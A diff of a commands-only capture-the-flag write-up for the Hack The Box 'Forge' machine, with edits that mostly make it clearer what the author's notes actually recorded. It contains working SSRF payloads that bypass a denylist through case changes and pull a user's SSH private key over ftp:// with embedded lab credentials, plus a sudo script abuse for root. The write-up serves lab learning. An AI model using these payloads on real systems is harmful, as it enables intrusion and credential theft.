@@ -17,7 +17,7 @@ ShowToc: true
 TocOpen: false
 ---
 
-Commands and output, one line per step. The reasoning, the dead ends, and why each pivot was chosen are in the [long version](../../offensive/forge/).
+Commands and output, one line per step. The reasoning, the dead ends, and why each pivot was chosen are in the [long version]({{< relref "/work/writeups/offensive/forge" >}}).
 
 Commands are formatted from my May notes rather than a fresh replay. The script internals in step 8 come from the source captured in [0xdf's write-up](https://0xdf.gitlab.io/2022/01/22/htb-forge.html#exploit); my notes recorded the behaviour, not the mechanism.
 
@@ -29,14 +29,10 @@ Target: `<target>`, attacker: `<attacker-ip>`. My notes never recorded either ad
 nmap -p- --min-rate 10000 -T4 -oA nmap/allports <target>
 ```
 
-```text
-21/tcp filtered ftp
-22/tcp open     ssh
-80/tcp open     http
-```
+Ports 22 and 80 answer, 21 comes back filtered. My notes kept no scan output.
 
 ```bash
-echo "<target> forge.htb admin.forge.htb" | sudo tee -a /etc/hosts
+echo "<target> forge.htb" | sudo tee -a /etc/hosts
 ```
 
 ```bash
@@ -45,11 +41,15 @@ gobuster vhost -u http://forge.htb \
 gobuster dir -u http://forge.htb -w /usr/share/wordlists/dirb/<wordlist>.txt
 ```
 
-`admin.forge.htb` serves localhost only. `/upload` takes a file or a URL.
+The vhost scan hits `admin.forge.htb`, which serves localhost only. `/upload` takes a file or a URL.
+
+```bash
+echo "<target> admin.forge.htb" | sudo tee -a /etc/hosts
+```
 
 ## Foothold
 
-**1. The denylist.** `http://127.0.0.1`, `http://forge.htb` and `http://127.1` all return `URL contains blacklisted address`.
+**1. The denylist.** `http://127.0.0.1` and `http://forge.htb` return `URL contains blacklisted address`. `http://127.1` also fails; my notes did not keep its response.
 
 **2. Case manipulation gets through.**
 
@@ -77,7 +77,7 @@ HTTPServer(('0.0.0.0', 80), Redirect).serve_forever()
 ```
 
 ```bash
-python3 redirect.py http://admin.forge.htb
+sudo python3 redirect.py http://admin.forge.htb
 ```
 
 **3. The announcements page.**
@@ -110,7 +110,7 @@ user.txt
 http://ADMIN.FoRge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/user.txt
 ```
 
-**6. The SSH key.** The account accepts a key only. Submit this one in the browser; Burp mangles the encoding.
+**6. The SSH key.** The account accepts a key only. Submit this one in the browser; Burp returned internal server errors, probably encoding.
 
 ```text
 http://ADMIN.Forge.Htb/upload?u=ftp://user:heightofsecurity123!@FORGE.htb/.ssh/id_rsa
@@ -159,6 +159,8 @@ sudo /usr/bin/python3 /opt/remote-manage.py
 nc localhost <port>
 ```
 
+Type the password, then a non-integer at the menu:
+
 ```text
 secretadminpassword
 asdf
@@ -177,7 +179,7 @@ cat /root/root.txt
 ## Chain summary
 
 1. `/upload` fetches a URL server-side and denylists `127.0.0.1` and `forge.htb`.
-2. `http://ADMIN.FORGE.HTB` passes the check, and a redirect server on the attacker box is a second route to the same place.
+2. `http://ADMIN.FORGE.HTB` passes the check, my read being that it compares strings while DNS ignores case, and a redirect server is a second route to the same place.
 3. The fetched body is saved as the uploaded image, so the response to any SSRF is readable.
 4. `admin.forge.htb/announcements` gives `user:heightofsecurity123!`, the supported `ftp://` scheme, and the `?u=` parameter.
 5. Passing `?u=ftp://user:pass@forge.htb` makes the admin uploader an FTP client against the filtered port 21.
